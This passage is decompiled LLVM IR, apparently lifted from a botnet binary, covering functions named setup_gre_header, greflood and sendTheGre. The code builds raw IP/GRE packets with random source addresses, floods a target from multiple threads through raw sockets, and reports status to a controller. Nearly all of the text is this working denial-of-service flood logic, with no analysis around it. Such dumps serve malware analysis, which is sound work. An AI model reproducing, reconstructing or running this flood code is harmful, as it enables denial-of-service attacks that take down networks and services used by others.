  %v9_1000556c = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_1004dc70.278 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32 %v0_10005558, i32 %v0_1000555c, i32 %v0_10005560, i32 %v2_1000553c, i32 ptrtoint (i32* @0 to i32))
  store i32 268457340, i32* @lr, align 4
  %v2_10005578 = call i32 @realrand(i32 1, i32 255)
  store i32 268457356, i32* @lr, align 4
  %v2_10005588 = call i32 @realrand(i32 1, i32 255)
  store i32 268457372, i32* @lr, align 4
  %v2_10005598 = call i32 @realrand(i32 1, i32 255)
  store i32 268457388, i32* @lr, align 4
  %v2_100055a8 = call i32 @realrand(i32 1, i32 255)
  store i32 ptrtoint (i32* @global_var_1004ed84.280 to i32), i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32* @r5, align 4
  %v0_100055c4 = load i32, i32* @r29, align 4
  %v0_100055c8 = load i32, i32* @r28, align 4
  %v0_100055cc = load i32, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_100055dc.281 to i32), i32* @lr, align 4
  %v9_100055d8 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_1004ed84.280 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32 %v0_100055c4, i32 %v0_100055c8, i32 %v0_100055cc, i32 %v2_100055a8, i32 ptrtoint (i32* @0 to i32))
  store i32 268457448, i32* @lr, align 4
  %v2_100055e4 = call i32 @realrand(i32 1, i32 255)
  store i32 268457464, i32* @lr, align 4
  %v2_100055f4 = call i32 @realrand(i32 1, i32 255)
  store i32 268457480, i32* @lr, align 4
  %v2_10005604 = call i32 @realrand(i32 1, i32 255)
  store i32 268457496, i32* @lr, align 4
  %v2_10005614 = call i32 @realrand(i32 1, i32 255)
  store i32 ptrtoint (i32* @global_var_1004edac.282 to i32), i32* @r3, align 4
  store i32 16, i32* @r4, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32* @r5, align 4
  %v0_10005630 = load i32, i32* @r29, align 4
  %v0_10005634 = load i32, i32* @r28, align 4
  %v0_10005638 = load i32, i32* @r27, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10005648.283 to i32), i32* @lr, align 4
  %v9_10005644 = call i32 @__GI_snprintf(i32 ptrtoint (i32* @global_var_1004edac.282 to i32), i32 16, i32 ptrtoint ([12 x i8]* @global_var_1002abfc.276 to i32), i32 %v0_10005630, i32 %v0_10005634, i32 %v0_10005638, i32 %v2_10005614, i32 ptrtoint (i32* @0 to i32))
  store i32 73, i32* @r3, align 4
  %v1_1000564c = call i32 @htons(i32 73)
  %sext = mul i32 %v1_1000564c, 65536
  %v1_10005650 = sdiv i32 %sext, 65536
  %v1_10005658 = trunc i32 %v1_10005650 to i16
  store i16 %v1_10005658, i16* inttoptr (i32 3 to i16*), align 2
  store i32 65535, i32* @r3, align 4
  %v1_10005664 = call i32 @htons(i32 65535)
  %v1_10005670 = trunc i32 %v1_10005664 to i16
  store i16 %v1_10005670, i16* inttoptr (i32 5 to i16*), align 2
  store i8 64, i8* inttoptr (i32 9 to i8*), align 1
  store i32 16384, i32* @r3, align 4
  %v1_10005684 = call i32 @htons(i32 16384)
  %v1_10005690 = trunc i32 %v1_10005684 to i16
  store i16 %v1_10005690, i16* inttoptr (i32 7 to i16*), align 2
  store i8 47, i8* inttoptr (i32 10 to i8*), align 2
  store i32 268457644, i32* @lr, align 4
  %v1_100056a8 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_1004ed98.275 to i32))
  store i32 %v1_100056a8, i32* inttoptr (i32 13 to i32*), align 4
  store i32 268457668, i32* @lr, align 4
  %v1_100056c0 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_1004dc70.278 to i32))
  store i32 %v1_100056c0, i32* inttoptr (i32 17 to i32*), align 4
  %v3_100056d4 = load i32, i32* @global_var_100451c8.274, align 4
  store i32 2, i32* @r3, align 4
  %v1_100056dc = call i32 @htons(i32 2)
  %sext3 = mul i32 %v1_100056dc, 65536
  %v1_100056e0 = sdiv i32 %sext3, 65536
  %v1_100056e4 = trunc i32 %v1_100056e0 to i16
  %v3_100056e4 = add i32 %v3_100056d4, 2
  %v4_100056e4 = inttoptr i32 %v3_100056e4 to i16*
  store i16 %v1_100056e4, i16* %v4_100056e4, align 2
  %v1_100056f4 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_100056f4, i32* inttoptr (i32 25 to i32*), align 4
  %v1_10005708 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10005708, i32* inttoptr (i32 25 to i32*), align 4
  store i8 0, i8* inttoptr (i32 26 to i8*), align 2
  store i32 540, i32* @r3, align 4
  %v1_10005720 = call i32 @htons(i32 540)
  %sext4 = mul i32 %v1_10005720, 65536
  %v1_10005724 = sdiv i32 %sext4, 65536
  %v1_1000572c = trunc i32 %v1_10005724 to i16
  store i16 %v1_1000572c, i16* inttoptr (i32 27 to i16*), align 2
  store i32 0, i32* @r3, align 4
  %v1_10005734 = call i32 @htons(i32 0)
  %v1_10005740 = trunc i32 %v1_10005734 to i16
  store i16 %v1_10005740, i16* inttoptr (i32 29 to i16*), align 2
  store i8 64, i8* inttoptr (i32 33 to i8*), align 1
  store i32 16384, i32* @r3, align 4
  %v1_10005754 = call i32 @htons(i32 16384)
  %v1_10005760 = trunc i32 %v1_10005754 to i16
  store i16 %v1_10005760, i16* inttoptr (i32 31 to i16*), align 2
  store i8 17, i8* inttoptr (i32 34 to i8*), align 2
  store i32 268457852, i32* @lr, align 4
  %v1_10005778 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_1004ed84.280 to i32))
  store i32 %v1_10005778, i32* inttoptr (i32 37 to i32*), align 4
  store i32 268457876, i32* @lr, align 4
  %v1_10005790 = call i32 @inet_addr(i32 ptrtoint (i32* @global_var_1004edac.282 to i32))
  store i32 %v1_10005790, i32* inttoptr (i32 41 to i32*), align 4
  ret i32 %v1_10005790

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_1004edac.282 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1004ed84.280 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1004dc70.278 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i32* @global_var_1004ed98.275 to i32), { 1, 0, 2 }
}

define i32 @setup_gre_header(i16* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 268457964, i32* @lr, align 4
  %v2_100057e8 = call i32 @realrand(i32 1, i32 99999)
  %v1_100057f0 = urem i32 %v2_100057e8, 65536
  store i32 %v1_100057f0, i32* @r3, align 4
  %v1_100057f8 = call i32 @htons(i32 %v1_100057f0)
  %sext = mul i32 %v1_100057f8, 65536
  %v1_100057fc = sdiv i32 %sext, 65536
  %v1_10005804 = trunc i32 %v1_100057fc to i16
  store i16 %v1_10005804, i16* %arg1, align 2
  store i32 268458004, i32* @lr, align 4
  %v2_10005810 = call i32 @realrand(i32 1, i32 255)
  %v1_10005818 = urem i32 %v2_10005810, 65536
  store i32 %v1_10005818, i32* @r3, align 4
  %v1_10005820 = call i32 @htons(i32 %v1_10005818)
  %v1_1000582c = trunc i32 %v1_10005820 to i16
  %v3_1000582c = add i32 %tmp, 2
  %v4_1000582c = inttoptr i32 %v3_1000582c to i16*
  store i16 %v1_1000582c, i16* %v4_1000582c, align 2
  %v3_10005838 = add i32 %tmp, 6
  %v4_10005838 = inttoptr i32 %v3_10005838 to i16*
  store i16 0, i16* %v4_10005838, align 2
  %v1_10005840 = add i32 %tmp, 8
  %v2_10005850 = inttoptr i32 %v1_10005840 to i32*
  store i32 -1, i32* %v2_10005850, align 4
  %v1_10005858 = add i32 %tmp, 12
  %v3_10005864 = inttoptr i32 %v1_10005858 to i16*
  store i16 2816, i16* %v3_10005864, align 2
  store i32 520, i32* @r3, align 4
  %v1_1000586c = call i32 @htons(i32 520)
  %v2_1000586c = trunc i32 %v1_1000586c to i16
  %v3_10005878 = add i32 %tmp, 4
  %v4_10005878 = inttoptr i32 %v3_10005878 to i16*
  store i16 %v2_1000586c, i16* %v4_10005878, align 2
  ret i32 %v1_1000586c

; uselistorder directives
  uselistorder i32 %v1_10005818, { 1, 0 }
  uselistorder i32 %v1_100057f0, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3, 4 }
}

define i32 @greflood(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4144 = alloca i32, align 4
  %v2_100058b8 = ptrtoint i32* %stack_var_-4144 to i32
  %v1_100058c4 = add i32 %v2_100058b8, 20
  %v1_100058d0 = add i32 %arg1, 8
  %v2_100058d0 = inttoptr i32 %v1_100058d0 to i32*
  %v3_100058d0 = load i32, i32* %v2_100058d0, align 4
  %v1_100058d4 = add i32 %arg1, 12
  %v2_100058d4 = inttoptr i32 %v1_100058d4 to i32*
  %v3_100058d4 = load i32, i32* %v2_100058d4, align 4
  store i32 %v3_100058d0, i32* %stack_var_-48, align 4
  store i32 268458240, i32* @lr, align 4
  %v3_100058fc = call i32 @socket(i32 2, i32 3, i32 17)
  %tmp23 = icmp sgt i32 %v3_100058fc, -1
  br i1 %tmp23, label %dec_label_pc_1000591c, label %dec_label_pc_10005914

dec_label_pc_10005914:                            ; preds = %entry
  %v0_10005918 = call i32 @__GI_exit()
  br label %dec_label_pc_1000591c

dec_label_pc_1000591c:                            ; preds = %entry, %dec_label_pc_10005914
  store i32 %v2_100058b8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 4096, i32* @r5, align 4
  store i32 268458304, i32* @lr, align 4
  %v0_1000593c = call i32 @__GI_memset()
  %v2_10005944 = call i32 @setup_gre_ip_header(i32* nonnull %stack_var_-4144)
  store i32 268458320, i32* @lr, align 4
  %v1_1000594c = inttoptr i32 %v1_100058c4 to i16*
  %v2_1000594c = call i32 @setup_gre_header(i16* %v1_1000594c)
  %v2_10005958 = add i32 %v2_100058b8, 16
  %v3_10005958 = inttoptr i32 %v2_10005958 to i32*
  store i32 %v3_100058d4, i32* %v3_10005958, align 4
  %v1_10005964 = or i32 %v2_100058b8, 2
  %v2_10005964 = inttoptr i32 %v1_10005964 to i16*
  %v3_10005964 = load i16, i16* %v2_10005964, align 2
  %v4_10005964 = zext i16 %v3_10005964 to i32
  %v2_10005974 = bitcast i32* %stack_var_-4144 to i16*
  %v3_10005974 = call i32 @csum(i16* %v2_10005974, i32 %v4_10005964)
  %v1_10005980 = trunc i32 %v3_10005974 to i16
  %v3_10005980 = add i32 %v2_100058b8, 10
  %v4_10005980 = inttoptr i32 %v3_10005980 to i16*
  store i16 %v1_10005980, i16* %v4_10005980, align 2
  store i32 1, i32* %stack_var_-32, align 4
  %v2_1000598c = ptrtoint i32* %stack_var_-32 to i32
  store i32 268458412, i32* @lr, align 4
  %v5_100059a8 = call i32 @__GI_setsockopt(i32 %v3_100058fc, i32 0, i32 3, i32 %v2_1000598c, i32 4)
  %tmp24 = icmp sgt i32 %v5_100059a8, -1
  br i1 %tmp24, label %dec_label_pc_100059c0, label %dec_label_pc_100059b8

dec_label_pc_100059b8:                            ; preds = %dec_label_pc_1000591c
  %v0_100059bc = call i32 @__GI_exit()
  br label %dec_label_pc_100059c0

dec_label_pc_100059c0:                            ; preds = %dec_label_pc_1000591c, %dec_label_pc_100059b8
  store i32 268458440, i32* @lr, align 4
  %v1_100059c4 = call i32 @__GI_time(i32 0)
  %v1_100059d0 = call i32 @init_rand(i32 %v1_100059c4)
  %v2_100059ec = ptrtoint i32* %stack_var_-48 to i32
  %v2_10005a68 = add i32 %v2_100058b8, 12
  %v3_10005a68 = inttoptr i32 %v2_10005a68 to i32*
  %v3_10005a88 = add i32 %v2_100058b8, 4
  %v4_10005a88 = inttoptr i32 %v3_10005a88 to i16*
  br label %dec_label_pc_100059dc

dec_label_pc_100059dc:                            ; preds = %dec_label_pc_10005af4, %dec_label_pc_100059c0
  %storemerge2 = phi i32 [ 0, %dec_label_pc_100059c0 ], [ %v1_10005af8, %dec_label_pc_10005af4 ]
  %v3_100059e0 = load i16, i16* %v2_10005964, align 2
  %v4_100059e0 = zext i16 %v3_100059e0 to i32
  store i32 268458512, i32* @lr, align 4
  %v6_10005a0c = call i32 @sendto(i32 %v3_100058fc, i32 %v2_100058b8, i32 %v4_100059e0, i32 0, i32 %v2_100059ec, i32 16)
  %v0_10005a10 = call i32 @rand_cmwc()
  %v1_10005a18 = urem i32 %v0_10005a10, 16777216
  %v1_10005a20 = sub i32 %v0_10005a10, %v1_10005a18
  %v0_10005a24 = call i32 @rand_cmwc()
  %v1_10005a30 = and i32 %v0_10005a24, 16711680
  %v2_10005a38 = or i32 %v1_10005a20, %v1_10005a30
  %v0_10005a3c = call i32 @rand_cmwc()
  %v1_10005a48 = and i32 %v0_10005a3c, 65280
  %v2_10005a50 = or i32 %v2_10005a38, %v1_10005a48
  %v0_10005a54 = call i32 @rand_cmwc()
  %v1_10005a5c = urem i32 %v0_10005a54, 256
  %v2_10005a60 = or i32 %v2_10005a50, %v1_10005a5c
  store i32 %v2_10005a60, i32* %v3_10005a68, align 4
  %v0_10005a6c = call i32 @rand_cmwc()
  store i32 %v0_10005a6c, i32* @r3, align 4
  %v1_10005a78 = call i32 @htonl(i32 %v0_10005a6c)
  %v1_10005a88 = trunc i32 %v1_10005a78 to i16
  store i16 %v1_10005a88, i16* %v4_10005a88, align 4
  %v3_10005a94 = load i16, i16* %v2_10005964, align 2
  %v4_10005a94 = zext i16 %v3_10005a94 to i32
  %v3_10005aa4 = call i32 @csum(i16* %v2_10005974, i32 %v4_10005a94)
  %v1_10005ab0 = trunc i32 %v3_10005aa4 to i16
  store i16 %v1_10005ab0, i16* %v4_10005980, align 2
  %v3_10005ab8 = load i32, i32* @global_var_100451ac.120, align 4
  %v1_10005abc = add i32 %v3_10005ab8, 1
  store i32 %v1_10005abc, i32* @global_var_100451ac.120, align 4
  %v3_10005acc = load i32, i32* @global_var_10045194.121, align 4
  %v3_10005ad4 = icmp ugt i32 %v3_10005acc, %storemerge2
  br i1 %v3_10005ad4, label %dec_label_pc_10005af4, label %dec_label_pc_10005adc

dec_label_pc_10005adc:                            ; preds = %dec_label_pc_100059dc
  %v3_10005ae8 = load i32, i32* @global_var_100450d4.122, align 4
  store i32 268458740, i32* @lr, align 4
  %v1_10005af0 = call i32 @usleep(i32 %v3_10005ae8)
  br label %dec_label_pc_10005af4

dec_label_pc_10005af4:                            ; preds = %dec_label_pc_100059dc, %dec_label_pc_10005adc
  %stack_var_-20.0 = phi i32 [ %storemerge2, %dec_label_pc_100059dc ], [ 0, %dec_label_pc_10005adc ]
  %v1_10005af8 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_100059dc

; uselistorder directives
  uselistorder i32 %v2_100058b8, { 5, 1, 2, 3, 0, 4, 6, 7 }
  uselistorder i32* %stack_var_-4144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10005af4, { 1, 0 }
  uselistorder label %dec_label_pc_100059c0, { 1, 0 }
  uselistorder label %dec_label_pc_1000591c, { 1, 0 }
}

define i32 @sendTheGre(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10005b04 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10005b04, i32* %stack_var_-112, align 4
  %v5_10005b04 = ptrtoint i32* %stack_var_-112 to i32
  store i32 268458808, i32* @lr, align 4
  %v1_10005b34 = call i32 @__GI_time(i32 0)
  %v1_10005b44 = call i32 @mfork(i32 %arg2)
  %v3_10005b4c = icmp eq i32 %v1_10005b44, 0
  br i1 %v3_10005b4c, label %dec_label_pc_10005b54, label %dec_label_pc_10005f48

dec_label_pc_10005b54:                            ; preds = %entry
  store i32 268458852, i32* @lr, align 4
  %v3_10005b60 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp33 = icmp sgt i32 %v3_10005b60, -1
  br i1 %tmp33, label %dec_label_pc_10005b80, label %dec_label_pc_10005b78

dec_label_pc_10005b78:                            ; preds = %dec_label_pc_10005b54
  %v0_10005b7c = call i32 @__GI_exit()
  br label %dec_label_pc_10005b80

dec_label_pc_10005b80:                            ; preds = %dec_label_pc_10005b54, %dec_label_pc_10005b78
  %v2_10005b84 = icmp sgt i32 %arg3, 4
  br i1 %v2_10005b84, label %dec_label_pc_10005bac, label %dec_label_pc_10005b8c

dec_label_pc_10005b8c:                            ; preds = %dec_label_pc_10005b80
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10005ba0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_1002ac08.286 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10005ba8 = call i32 @__GI_exit()
  br label %dec_label_pc_10005bac

dec_label_pc_10005bac:                            ; preds = %dec_label_pc_10005b80, %dec_label_pc_10005b8c
  %v1_10005bb0 = add i32 %arg4, 12
  store i32 %v1_10005bb0, i32* %r9.global-to-local, align 4
  %v1_10005bb4 = inttoptr i32 %v1_10005bb0 to i32*
  %v2_10005bb4 = load i32, i32* %v1_10005bb4, align 4
  store i32 268458944, i32* @lr, align 4
  %v1_10005bbc = call i32 @atol(i32 %v2_10005bb4)
  %v1_10005bcc = add i32 %arg4, 16
  store i32 %v1_10005bcc, i32* %r9.global-to-local, align 4
  %v1_10005bd0 = inttoptr i32 %v1_10005bcc to i32*
  %v2_10005bd0 = load i32, i32* %v1_10005bd0, align 4
  store i32 268458972, i32* @lr, align 4
  %v1_10005bd8 = call i32 @atol(i32 %v2_10005bd0)
  %v1_10005be8 = add i32 %arg4, 8
  store i32 %v1_10005be8, i32* %r9.global-to-local, align 4
  %v1_10005bec = inttoptr i32 %v1_10005be8 to i32*
  %v2_10005bec = load i32, i32* %v1_10005bec, align 4
  store i32 268459000, i32* @lr, align 4
  %v1_10005bf4 = call i32 @atol(i32 %v2_10005bec)
  %v1_10005c04 = add i32 %arg4, 20
  store i32 %v1_10005c04, i32* %r9.global-to-local, align 4
  %v1_10005c08 = inttoptr i32 %v1_10005c04 to i32*
  %v2_10005c08 = load i32, i32* %v1_10005c08, align 4
  store i32 268459028, i32* @lr, align 4
  %v1_10005c10 = call i32 @atol(i32 %v2_10005c08)
  store i32 0, i32* @global_var_10045194.121, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  %v1_10005c38 = mul i32 %v1_10005bbc, 4
  %v1_10005c40 = add i32 %v1_10005c38, 30
  %v1_10005c44 = and i32 %v1_10005c40, -16
  %v2_10005c4c = load i32, i32* %stack_var_-112, align 4
  %v1_10005c54 = load i32, i32* @r1, align 4
  %v3_10005c54 = sub i32 %v1_10005c54, %v1_10005c44
  %v4_10005c54 = inttoptr i32 %v3_10005c54 to i32*
  store i32 %v2_10005c4c, i32* %v4_10005c54, align 4
  %v1_10005c64 = add i32 %v3_10005c54, 23
  %v1_10005c68 = and i32 %v1_10005c64, -16
  store i32 %v1_10005c68, i32* %r9.global-to-local, align 4
  %v1_10005c88 = urem i32 %v1_10005bf4, 65536
  store i32 %v1_10005c88, i32* @r3, align 4
  %v1_10005c90 = call i32 @htons(i32 %v1_10005c88)
  %v1_10005ca0 = add i32 %arg4, 4
  store i32 %v1_10005ca0, i32* %r9.global-to-local, align 4
  %v1_10005ca4 = inttoptr i32 %v1_10005ca0 to i32*
  %v2_10005ca4 = load i32, i32* %v1_10005ca4, align 4
  store i32 268459184, i32* @lr, align 4
  %v1_10005cac = call i32 @inet_addr(i32 %v2_10005ca4)
  %v1_10005cbc = mul i32 %v1_10005bbc, 24
  %v1_10005cc0 = add i32 %v1_10005cbc, 15
  store i32 %v1_10005cc0, i32* %r9.global-to-local, align 4
  %v1_10005cc4 = add i32 %v1_10005cbc, 30
  %v1_10005cc8 = and i32 %v1_10005cc4, -16
  %v0_10005cd0 = load i32, i32* @r1, align 4
  %v1_10005cd0 = inttoptr i32 %v0_10005cd0 to i32*
  %v2_10005cd0 = load i32, i32* %v1_10005cd0, align 4
  %v3_10005cd8 = sub i32 %v0_10005cd0, %v1_10005cc8
  %v4_10005cd8 = inttoptr i32 %v3_10005cd8 to i32*
  store i32 %v2_10005cd0, i32* %v4_10005cd8, align 4
  %v1_10005ce8 = add i32 %v3_10005cd8, 23
  %v1_10005cec = and i32 %v1_10005ce8, -16
  store i32 %v1_10005bbc, i32* %r9.global-to-local, align 4
  %v2_10005dc42 = icmp sgt i32 %v1_10005bbc, 0
  br i1 %v2_10005dc42, label %dec_label_pc_10005d14, label %dec_label_pc_10005dcc

dec_label_pc_10005d14:                            ; preds = %dec_label_pc_10005bac, %dec_label_pc_10005d14
  %storemerge15 = phi i32 [ %v1_10005db4, %dec_label_pc_10005d14 ], [ 0, %dec_label_pc_10005bac ]
  %v1_10005d1c = mul i32 %storemerge15, 24
  %v2_10005d20 = add i32 %v1_10005d1c, %v1_10005cec
  %v2_10005d28 = inttoptr i32 %v2_10005d20 to i32*
  store i32 %storemerge15, i32* %v2_10005d28, align 8
  store i32 %v2_10005d20, i32* %r9.global-to-local, align 4
  store i32 %v1_10005cac, i32* %r11.global-to-local, align 4
  store i32 %tmp7, i32* @r8, align 4
  %v2_10005d4c = add i32 %v2_10005d20, 8
  %v3_10005d4c = inttoptr i32 %v2_10005d4c to i32*
  store i32 2, i32* %v3_10005d4c, align 8
  %v0_10005d50 = load i32, i32* %r11.global-to-local, align 4
  %v1_10005d50 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005d50 = add i32 %v1_10005d50, 12
  %v3_10005d50 = inttoptr i32 %v2_10005d50 to i32*
  store i32 %v0_10005d50, i32* %v3_10005d50, align 4
  %v0_10005d54 = load i32, i32* @r10, align 4
  %v1_10005d54 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005d54 = add i32 %v1_10005d54, 16
  %v3_10005d54 = inttoptr i32 %v2_10005d54 to i32*
  store i32 %v0_10005d54, i32* %v3_10005d54, align 4
  %v1_10005d58 = load i32, i32* %r9.global-to-local, align 4
  %v2_10005d58 = add i32 %v1_10005d58, 20
  %v3_10005d58 = inttoptr i32 %v2_10005d58 to i32*
  store i32 %tmp7, i32* %v3_10005d58, align 4
  %v1_10005d6c = or i32 %v2_10005d20, 4
  %v2_10005d74 = inttoptr i32 %v1_10005d6c to i32*
  store i32 %v1_10005bf4, i32* %v2_10005d74, align 4
  %v1_10005d80 = mul i32 %storemerge15, 4
  %v2_10005d84 = add i32 %v1_10005d80, %v1_10005c68
  store i32 %v2_10005d84, i32* %r11.global-to-local, align 4
  store i32 268435456, i32* %r9.global-to-local, align 4
  store i32 268459440, i32* @lr, align 4
  %v6_10005dac = inttoptr i32 %v2_10005d84 to i32*
  %v7_10005dac = call i32 @pthread_create(i32* %v6_10005dac, i32 0, i32 268458132, i32 %v2_10005d20, i32 %tmp7, i32 268435456)
  %v1_10005db4 = add nuw nsw i32 %storemerge15, 1
  store i32 %v1_10005bbc, i32* %r9.global-to-local, align 4
  %v2_10005dc4 = icmp slt i32 %v1_10005db4, %v1_10005bbc
  br i1 %v2_10005dc4, label %dec_label_pc_10005d14, label %dec_label_pc_10005dcc

dec_label_pc_10005dcc:                            ; preds = %dec_label_pc_10005d14, %dec_label_pc_10005bac
  store i32 %v1_10005ca0, i32* %r9.global-to-local, align 4
  %v2_10005dd4 = load i32, i32* %v1_10005ca4, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10005df0 = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_1002ac70.287 to i32), i32 %arg2, i32 %v2_10005dd4)
  store i32 %v1_10005bcc, i32* %r9.global-to-local, align 4
  %v2_10005e04 = load i32, i32* %v1_10005bd0, align 4
  store i32 268459536, i32* @lr, align 4
  %v1_10005e0c = call i32 @atol(i32 %v2_10005e04)
  %v2_10005e18 = mul i32 %v1_10005e0c, 20
  store i32 %v2_10005e18, i32* %r9.global-to-local, align 4
  %v3_10005e20 = icmp sgt i32 %v2_10005e18, 0
  br i1 %v3_10005e20, label %dec_label_pc_10005e28, label %dec_label_pc_10005f40

dec_label_pc_10005e28:                            ; preds = %dec_label_pc_10005dcc
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268459584, i32* @lr, align 4
  %v1_10005e3c = call i32 @usleep(i32 50000)
  %v3_10005e44 = load i32, i32* @global_var_100451ac.120, align 4
  %v2_10005e4c = mul i32 %v3_10005e44, 20
  %v3_10005e54 = icmp ugt i32 %v2_10005e4c, %v1_10005bd8
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10005e60 = load i32, i32* @global_var_10045194.121, align 4
  br i1 %v3_10005e54, label %dec_label_pc_10005e5c, label %dec_label_pc_10005e9c

dec_label_pc_10005e5c:                            ; preds = %dec_label_pc_10005e28
  %v2_10005e64 = icmp sgt i32 %v3_10005e60, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_10005e64, label %dec_label_pc_10005e84, label %dec_label_pc_10005e6c

dec_label_pc_10005e6c:                            ; preds = %dec_label_pc_10005e5c
  %v3_10005e70 = load i32, i32* @global_var_100450d4.122, align 4
  %v1_10005e74 = add i32 %v3_10005e70, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10005e74, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10005ee4

dec_label_pc_10005e84:                            ; preds = %dec_label_pc_10005e5c
  %v1_10005e8c = add i32 %v3_10005e60, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10005e8c, i32* @global_var_10045194.121, align 4
  br label %dec_label_pc_10005ee4

dec_label_pc_10005e9c:                            ; preds = %dec_label_pc_10005e28
  %v1_10005ea4 = add i32 %v3_10005e60, 1
  store i32 %v1_10005ea4, i32* @global_var_10045194.121, align 4
  %v3_10005eb4 = load i32, i32* @global_var_100450d4.122, align 4
  %tmp34 = icmp ult i32 %v3_10005eb4, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp34, label %dec_label_pc_10005ed8, label %dec_label_pc_10005ec0

dec_label_pc_10005ec0:                            ; preds = %dec_label_pc_10005e9c
  %v1_10005ec8 = add i32 %v3_10005eb4, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10005ec8, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10005ee4

dec_label_pc_10005ed8:                            ; preds = %dec_label_pc_10005e9c
  store i32 0, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10005ee4

dec_label_pc_10005ee4:                            ; preds = %dec_label_pc_10005ec0, %dec_label_pc_10005e84, %dec_label_pc_10005e6c, %dec_label_pc_10005ed8
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  %v2_10005f14 = add i32 %v1_10005c10, %v1_10005b34
  br label %dec_label_pc_10005ef0

dec_label_pc_10005ef0:                            ; preds = %dec_label_pc_10005f30, %dec_label_pc_10005ee4
  %stack_var_-100.0 = phi i32 [ %tmp, %dec_label_pc_10005ee4 ], [ %v1_10005f34, %dec_label_pc_10005f30 ]
  %tmp35 = icmp ult i32 %stack_var_-100.0, 100
  br i1 %tmp35, label %dec_label_pc_10005f30, label %dec_label_pc_10005efc

dec_label_pc_10005efc:                            ; preds = %dec_label_pc_10005ef0
  store i32 268459780, i32* @lr, align 4
  %v1_10005f00 = call i32 @__GI_time(i32 0)
  store i32 %v1_10005f00, i32* %r11.global-to-local, align 4
  store i32 %v1_10005b34, i32* %r9.global-to-local, align 4
  %v2_10005f18 = icmp ult i32 %v1_10005f00, %v2_10005f14
  br i1 %v2_10005f18, label %dec_label_pc_10005f28, label %dec_label_pc_10005f20

dec_label_pc_10005f20:                            ; preds = %dec_label_pc_10005efc
  %v0_10005f24 = call i32 @__GI_exit()
  br label %dec_label_pc_10005f28

dec_label_pc_10005f28:                            ; preds = %dec_label_pc_10005efc, %dec_label_pc_10005f20
  br label %dec_label_pc_10005f30

dec_label_pc_10005f30:                            ; preds = %dec_label_pc_10005ef0, %dec_label_pc_10005f28
  %stack_var_-100.1 = phi i32 [ %stack_var_-100.0, %dec_label_pc_10005ef0 ], [ 0, %dec_label_pc_10005f28 ]
  store i32 %stack_var_-100.1, i32* %r9.global-to-local, align 4
  %v1_10005f34 = add i32 %stack_var_-100.1, 1
  br label %dec_label_pc_10005ef0

dec_label_pc_10005f40:                            ; preds = %dec_label_pc_10005dcc
  %v0_10005f44 = call i32 @__GI_exit()
  br label %dec_label_pc_10005f48

dec_label_pc_10005f48:                            ; preds = %entry, %dec_label_pc_10005f40
  %v0_10005f6c = phi i32 [ %v1_10005b44, %entry ], [ %v0_10005f44, %dec_label_pc_10005f40 ]
  %v2_10005f48 = load i32, i32* %stack_var_-112, align 4
  store i32 %v5_10005b04, i32* %r9.global-to-local, align 4
  store i32 %v2_10005f48, i32* %r11.global-to-local, align 4
